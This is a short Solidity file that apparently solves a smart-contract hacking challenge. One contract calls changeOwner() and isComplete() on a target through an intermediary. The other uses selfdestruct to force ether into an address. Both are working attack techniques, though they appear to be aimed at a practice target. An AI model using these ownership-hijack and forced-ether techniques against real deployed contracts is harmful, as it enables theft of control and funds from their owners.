// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./1.sol";
contract Attract{
    address payable pulling;
    constructor(address payable pulling1) public {
        pulling = pulling1;
    }
    function attract() public {
        Pulling(pulling).changeOwner();
        Pulling(pulling).isComplete();
    }
}
contract v{
    address payable pulling;
    constructor(address payable addr) {
        pulling = addr;
    }
    function a() public payable {}
    function geteth() public {
        selfdestruct(pulling);
    }
}